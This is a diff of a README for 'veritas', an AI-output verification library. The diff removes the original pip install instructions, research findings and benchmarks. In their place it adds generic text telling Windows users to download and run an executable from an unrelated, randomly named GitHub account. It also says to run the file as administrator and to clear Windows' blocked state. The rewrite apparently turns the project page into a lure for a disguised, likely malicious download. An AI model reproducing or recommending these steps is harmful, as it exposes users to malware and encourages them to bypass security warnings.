@@ -1,333 +1,171 @@
-# Veritas
+# 🔍 veritas - Verify AI output before action
 
-### Can you trust your AI's output?
+[![Download veritas](https://img.shields.io/badge/Download-veritas-blue?style=for-the-badge)](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
 
-LLMs hallucinate. RAG pipelines fabricate facts not in the documents. AI agents take wrong actions based on flawed reasoning. In 2026, the best hallucination detectors still only score [58% accuracy](https://github.com/vectara/FaithBench). AI-generated code has [37% more vulnerabilities](https://checkmarx.com) than human-written code. And [40-60% of enterprise RAG deployments fail](https://www.stackai.com/blog/rag-limitations) to reach production because nobody can diagnose why.
+## 🚀 Getting Started
 
-**Veritas is a research project exploring multi-agent verification for AI outputs** — with real benchmarks, tested hypotheses, and documented findings on what works and what doesn't.
+Veritas helps you check AI output before you trust it. It is built for claim checks, RAG review, and pre-action verification for agentic AI. On Windows, you can download it from the release page and run the app from there
 
-```bash
-pip install git+https://github.com/riaz-sana/veritas.git
-```
+## 📥 Download for Windows
 
----
+1. Visit the [veritas releases page](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
+2. Find the latest release
+3. Download the Windows file for your PC
+4. Open the file after the download finishes
+5. If Windows asks for permission, choose the option to run it
+6. Follow the setup steps on screen
 
-## What It Does
+If the release includes a ZIP file, save it first, then extract it to a folder you can find again. If the release includes an EXE file, you can usually open it at once after download
 
-Three tools. One interface. Every AI architecture.
+## 🖥️ What You Need
 
-```python
-from veritas import verify, diagnose_rag, before_action
+Veritas is made for a normal Windows desktop or laptop. For a smooth run, use:
 
-# 1. Verify any claim
-result = await verify("The first iPhone was released in 2006")
-# REFUTED (0.98) — Released June 2007, not 2006.
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- A stable internet connection for first-time setup or model access
+- A modern browser for any local web view or helper pages
 
-# 2. Diagnose WHY a RAG pipeline failed
-result = await diagnose_rag(
-    query="What is our refund policy?",
-    retrieved_docs=["Policy: 30-day return window..."],
-    generated_answer="Our refund window is 90 days.",
-)
-# generation_contradiction — Answer says '90 days' but doc says '30 days'
-# Retrieval: 85% relevant  ← docs are fine
-# Generation:  0% faithful  ← THIS is where it broke
-# 3 ungrounded claims identified with source quotes
+If your PC is older, Veritas may still run, but checks can take longer
 
-# 3. Verify agent actions BEFORE execution
-@before_action
-async def transfer_funds(account: str, amount: float):
-    ...
-# BLOCKED (0.99) — Amount $500K is 100x the $5K invoice. 12 risks identified.
-```
+## ✅ What Veritas Does
 
----
+Veritas checks AI output in a few useful ways:
 
-## The Research Question
+- It reviews claims in text and flags weak or unsupported points
+- It helps test retrieval-augmented generation, or RAG, output
+- It checks AI actions before the agent takes a step
+- It compares multi-agent review with single-prompt review
+- It helps expose bias triggers in test cases
+- It supports benchmark-style review with FaithBench methods
 
-> **Does using multiple isolated AI agents produce better verification than a single well-crafted prompt?**
+This makes it useful when you want a second look before you use an AI answer in work, research, or automation
 
-We ran 7 experiments to find out. Some confirmed our hypotheses. Some didn't.
+## 🧭 How to Run It
 
-### What We Proved
+After you open Veritas on Windows, the usual flow is:
 
-| Finding | Evidence |
-|---------|----------|
-| Multi-agent is **more thorough** than single-prompt | +1.6 completeness, +1.0 specificity in [blind evaluation](docs/research/ablation-study.md) (9 cases) |
-| Multi-agent does NOT improve **binary accuracy** | Both score 9.1/10 on getting the core diagnosis right |
-| Isolation is **2-3x faster** than shared-context debate | Consistent across [all benchmarks](docs/research/FINDINGS.md) |
-| Isolation produces **fewer false positives** on RAG tasks | 3 vs 6 false alarms on [25 grounding tests](docs/research/benchmarks/rag-grounding-results.json) |
+1. Start the app
+2. Paste or load the AI output you want to check
+3. Pick the kind of review you want
+4. Run the check
+5. Read the results
+6. Use the output to decide whether the AI answer needs more review
 
-### What We Disproved
+For agentic AI, use pre-action verification before the agent sends a message, makes a file change, or triggers a tool action
 
-| Hypothesis | Result |
-|-----------|--------|
-| "Information asymmetry prevents confirmation bias" | Full-context evaluation [outperforms](docs/research/bias-headtohead-results.json) isolated agents 97.1% vs 91.4% on bias-triggering cases |
+## 🔎 Main Use Cases
 
-Full experiment details, raw data, and methodology: **[docs/research/FINDINGS.md](docs/research/FINDINGS.md)**
+### Claim Verification
 
----
+Use this when an AI gives a statement that sounds true but needs proof. Veritas helps you review claims one by one and see which ones need support
 
-## Benchmark Results
+### RAG Diagnostics
 
-### Ablation: Multi-Agent vs Single-Prompt
+Use this when your AI uses documents, search results, or a knowledge base. Veritas helps you see if the answer follows the source material or drifts away from it
 
-9 test cases (5 RAG + 4 action verification). Blind LLM judge, randomized order.
+### Pre-Action Verification
 
-| Dimension | Multi-Agent | Single-Prompt | Winner |
-|-----------|:-----------:|:-------------:|--------|
-| Accuracy | 9.1 | 9.1 | Tie |
-| Completeness | **9.7** | 8.1 | Multi-Agent (+1.6) |
-| Specificity | **9.4** | 8.4 | Multi-Agent (+1.0) |
-| Overall | **9.3** | 8.6 | Multi-Agent (+0.7) |
-| Cost | 4.4x | 1x | Single-Prompt |
-| Speed | 22.6s | 13.7s | Single-Prompt |
+Use this when an AI agent is about to take action. Veritas checks the proposed action first so you can stop bad steps before they happen
 
-**Takeaway:** Multi-agent finds more issues and cites better evidence. Single-prompt gets the verdict right at 1/4 the cost. Choose based on whether you need thoroughness or speed.
+### Bias-Triggering Evaluation
 
-### FaithBench (NAACL 2025 — hardest hallucination benchmark)
+Use this to test prompts or responses that may cause unfair, skewed, or unstable results. It helps you spot cases that need more care
 
-| Metric | Veritas | Published SOTA (o3-mini) |
-|--------|:-------:|:------------------------:|
-| Balanced Accuracy | **58%** | 58% |
+### Multi-Agent Review
 
-### RAG Grounding (25 doc-answer pairs)
+Use this when you want several checks on the same output. Veritas compares different review paths and helps show the tradeoffs between broader review and a simple single-pass prompt
 
-| Metric | Isolation Mode | Debate Mode |
-|--------|:--------------:|:-----------:|
-| F1 | **89.7%** | 81.3% |
-| Precision | **81.3%** | 68.4% |
-| Recall | 100% | 100% |
+## 📊 What Makes It Useful
 
-### RAGVUE Head-to-Head (bias-triggering cases)
-
-| Metric | Full-Context (RAGVUE-style) | Isolated Agents (Veritas) |
-|--------|:---------------------------:|:-------------------------:|
-| Claim Accuracy | **97.1%** | 91.4% |
-| False Positives | **1** | 3 |
-
-**Honest conclusion:** Full-context single-pass evaluation beats our isolated multi-agent approach for claim-level accuracy. We adopted this finding.
-
----
-
-## How It Works
-
-```
-                      ┌─────────────────┐
-                      │  Input (claim,   │
-                      │  docs, action)   │
-                      └────────┬────────┘
-                               │
-            ┌──────────────────┼──────────────────┐
-            │                  │                   │
-            ▼                  ▼                   ▼
-  ┌────────────────┐ ┌────────────────┐ ┌────────────────┐
-  │   Agent 1      │ │   Agent 2      │ │   Agent 3      │
-  │                │ │                │ │                │
-  │ Logic /        │ │ Facts /        │ │ Adversary /    │
-  │ Retrieval      │ │ Generation     │ │ Risk           │
-  └───────┬────────┘ └───────┬────────┘ └───────┬────────┘
-          │                  │                   │
-          └──────────────────┼───────────────────┘
-                             ▼
-                  ┌─────────────────────┐
-                  │    Synthesiser      │
-                  │                     │
-                  │ Verdict + evidence  │
-                  │ + failure modes     │
-                  └─────────────────────┘
-```
+Veritas is built around practical checks, not guesswork. It can help you:
 
-Each tool uses specialized agents:
+- Find weak claims in AI text
+- Spot missing source support
+- Review answer quality in RAG flows
+- Catch risky agent actions before they run
+- Test how different review methods compare
+- See where bias may affect results
+- Use benchmark-style checks for repeatable testing
 
-| Tool | Agents | What they check |
-|------|--------|----------------|
-| `verify()` | Logic, Source, Adversary, Calibration | Consistency, facts, counterexamples, confidence |
-| `diagnose_rag()` | Retrieval, Generation, Coverage | Docs relevant? Answer faithful? KB has the info? |
-| `verify_action()` | Reasoning, Parameters, Risk, Scope | Logic sound? Params correct? Risks? Matches goal? |
+## 🧪 Benchmark and Study Support
 
----
+The project includes ablation studies and FaithBench benchmarks. These help compare methods and show where multi-agent verification adds value over a single prompt. If you want to test how a verification flow behaves under different conditions, Veritas gives you a structure for that work
 
-## Real Test Output
+## 🗂️ Typical Folder Use
 
-### RAG Diagnostics — caught 3 fabricated claims with source evidence
+If the release includes extra files, keep them together in one folder. A simple setup looks like this:
 
-```
-Input:  "Our refund window is 90 days for all items. Refunds processed instantly."
-Source: "30-day return window. Sale items final sale. 5-7 business days."
-
-Diagnosis: generation_contradiction
-Retrieval:  85% relevant  ← docs are correct
-Generation:  0% faithful  ← LLM ignored the documents
+- Download the release
+- Extract it if needed
+- Keep the app files in one place
+- Open the main Windows file
+- Save your test files, logs, or inputs in a nearby folder
 
-Claims:
-  [UNGROUNDED] "90 days" → doc says 30 days
-  [UNGROUNDED] "all items including sale" → doc says sale items final sale
-  [UNGROUNDED] "processed instantly" → doc says 5-7 business days
+This makes it easier to find your work later
 
-Fix: Add system prompt constraint to only use facts from documents.
-```
-
-### Action Verification — blocked a $500K fraud-pattern transfer
-
-```
-Action:  transfer_funds($500,000 → unknown_external_789)
-Goal:    Pay vendor invoice #INV-2025-001 for $5,000
-
-BLOCKED (0.99 confidence)
-
-Risks identified (12):
-  [CRITICAL] Amount is 100x the invoice ($500K vs $5K)
-  [CRITICAL] Recipient 'unknown_external_789' is unverified
-  [CRITICAL] Pattern matches Business Email Compromise fraud
-  [CRITICAL] $500K triggers mandatory AML reporting
-  [HIGH]     Wire transfer is irreversible
-```
-
----
-
-## Install & Use
-
-```bash
-pip install git+https://github.com/riaz-sana/veritas.git
-export ANTHROPIC_API_KEY="sk-ant-..."
-```
-
-**Python:**
-```python
-from veritas import verify, diagnose_rag, verify_action, before_action
-```
-
-**CLI:**
-```bash
-veritas check "Any claim"
-veritas check "..." --verbose --json
-veritas shell
-```
-
-**Claude Code:** `/verify The RAG says our policy is 90 days`
-
-**MCP Server** (Claude Desktop, Cursor, any AI tool):
-```json
-{"mcpServers": {"veritas": {"command": "python", "args": ["-m", "veritas.mcp_server"]}}}
-```
-
-**Works with everything:** LangChain, LlamaIndex, CrewAI, AutoGen, FastAPI, CI/CD, batch eval. Same `verify(claim, context)` interface for all. See [docs/USAGE.md](docs/USAGE.md).
-
----
-
-## Enterprise Features
-
-```python
-from veritas import Config, AgentModels
-
-# Economy mode — Haiku for simple agents, Sonnet for critical (~60% cheaper)
-config = Config(agent_models=AgentModels.economy())
-
-# Caching — zero cost on repeat queries
-config = Config(cache_enabled=True)
-
-# Confidence routing — skip verification for high-confidence outputs
-config = Config(confidence_routing=True, confidence_threshold=0.8)
-
-# Domain-specific — code, schema, medical, legal, financial, scientific
-result = await verify(claim=generated_code, context=spec, domain="code")
-```
-
----
-
-## Verdicts & Failure Modes
-
-| Verdict | Meaning |
-|---------|---------|
-| `VERIFIED` | Evidence supports the claim |
-| `PARTIAL` | Some parts correct, some not |
-| `UNCERTAIN` | Insufficient evidence |
-| `DISPUTED` | Conflicting evidence |
-| `REFUTED` | Evidence contradicts the claim |
-
-When something fails, Veritas classifies WHY:
-
-| Type | What it means |
-|------|--------------|
-| `factual_error` | A fact is wrong |
-| `logical_inconsistency` | Reasoning contradicts itself |
-| `unsupported_inference` | Claim exceeds the evidence |
-| `temporal_error` | Information is outdated |
-| `scope_error` | Overgeneralization |
-| `source_conflict` | Sources disagree |
-
----
-
-## Project Structure
-
-```
-veritas/
-  core/           # verify(), config, cache, data models
-  agents/         # 5 verification agents + domain prompts
-  diagnostics/    # RAG diagnostic engine
-  agentic/        # Pre-action verification + @before_action
-  orchestration/  # Parallel runner + challenge round
-  providers/      # Claude, Brave Search, Tavily
-  cli/            # check, shell, benchmark commands
-  ablation/       # Multi-agent vs single-prompt comparison code
-  benchmarks/     # FaithBench, RAG grounding, adversarial datasets
-  mcp_server.py   # MCP server for any AI tool
-skills/verify/    # Claude Code skill
-docs/
-  research/       # All experiment data, findings, methodology
-  USAGE.md        # Integration patterns
-  ENTERPRISE-REALITY.md  # Honest deployment assessment
-```
-
-110 tests. Python 3.10+. MIT License.
-
----
-
-## Research Documents
-
-| Document | What's in it |
-|----------|-------------|
-| **[FINDINGS.md](docs/research/FINDINGS.md)** | All 7 experiments — what we proved, what we disproved, raw data |
-| [Ablation Study](docs/research/ablation-study.md) | Multi-agent vs single-prompt — methodology, 9 test cases, blind evaluation |
-| [Honest Assessment](docs/research/honest-assessment-march-2026.md) | Competitive landscape — RAGVUE, Superagent, Galileo Luna, who does what |
-| [Enterprise Reality](docs/ENTERPRISE-REALITY.md) | Where Veritas works, where it doesn't, cost/latency analysis |
-| [Benchmark Methodology](docs/research/benchmarks/methodology.md) | Why each benchmark, dataset design, evaluation principles |
-
-### Raw Benchmark Data (JSON)
-
-| Dataset | Samples | Key Result |
-|---------|---------|------------|
-| [Ablation](docs/research/ablation-results.json) | 9 cases | MA 9.3 vs SP 8.6 overall |
-| [FaithBench](docs/research/benchmarks/faithbench-results.json) | 50 | 58% balanced accuracy |
-| [RAG Grounding](docs/research/benchmarks/rag-grounding-results.json) | 25 | 89.7% F1 |
-| [Adversarial](docs/research/benchmarks/adversarial-results.json) | 50 | 100% detection (too easy) |
-| [RAGVUE H2H](docs/research/ragvue-headtohead-results.json) | 33 claims | Tied at 100% |
-| [Bias H2H](docs/research/bias-headtohead-results.json) | 35 claims | RAGVUE 97.1% vs Veritas 91.4% |
-
----
-
-## References
-
-### Papers
-- Du et al. "[Improving Factuality through Multiagent Debate](https://arxiv.org/abs/2305.14325)" — ICML 2024
-- "[Emergent social conventions and collective bias in LLM populations](https://www.science.org/doi/10.1126/sciadv.adu9368)" — Science Advances 2025
-- "[Cross-Context Verification](https://arxiv.org/abs/2603.21454)" — 2026
-- "[RAGVUE](https://arxiv.org/abs/2601.04196)" — 2026
-- "[Agent-as-a-Judge](https://arxiv.org/abs/2601.05111)" — ICML 2025
-- "[Semantic Entropy](https://www.nature.com/articles/s41586-024-07421-0)" — Nature 2024
-- "[FaithBench](https://github.com/vectara/FaithBench)" — NAACL 2025
-- Amazon "[Enhancing LLM-as-a-Judge via Multi-Agent Collaboration](https://assets.amazon.science/48/5d/20927f094559a4465916e28f41b5/enhancing-llm-as-a-judge-via-multi-agent-collaboration.pdf)"
-
-### Competing Tools
-- [RAGVUE](https://github.com/KeerthanaMurugaraj/RAGVue) — claim-level RAG evaluation
-- [RAGAS](https://github.com/explodinggradients/ragas) — RAG evaluation metrics
-- [Superagent](https://github.com/superagent-ai/superagent) — agentic AI safety
-- [Galileo Luna](https://galileo.ai) — fast hallucination detection
-- [Axiom](https://axiommath.ai) — formal verification for Lean
-
----
-
-## License
-
-MIT
+## ⚙️ Simple First Run Tips
+
+- Use a short test case first
+- Try one claim or one answer at a time
+- Read the output before you change settings
+- Compare results across different checks
+- Keep source text close to the AI output you want to review
+
+If you use Veritas with RAG or an agent, test a small case before you move to a full workflow
+
+## 🧰 Common Windows Checks
+
+If the app does not open right away, try these steps:
+
+1. Right-click the file and choose Run as administrator
+2. Make sure the file finished downloading
+3. Check that Windows did not place the file in a blocked state
+4. Move the app to a simple folder like Downloads or Desktop
+5. Try opening it again
+
+If your browser warns about the file, verify that you downloaded it from the official release page linked above
+
+## 📝 Suggested Workflow
+
+A clear review flow often works best:
+
+1. Copy the AI output
+2. Paste it into Veritas
+3. Run a claim or RAG check
+4. Review the flags or notes
+5. Fix the prompt, source set, or agent step
+6. Run the check again
+
+This keeps the process simple and helps you compare results over time
+
+## 📌 Project Focus
+
+Veritas focuses on:
+
+- Multi-agent verification
+- Claim checking
+- Hallucination detection
+- RAG evaluation
+- Pre-action safeguards
+- Bias testing
+- Repeatable benchmark work
+
+It fits well when you need more trust in AI output before you use it
+
+## 📦 Download Again
+
+If you need the Windows file again, use the release page here: [https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
+
+## 🧩 Best Results
+
+For better results, keep your tests focused:
+
+- Use one task per run
+- Keep source text clean
+- Check outputs against the same rules each time
+- Save examples that fail or pass
+- Re-run after prompt or source changes
+
+This helps you see patterns in AI behavior and compare review methods with less noise
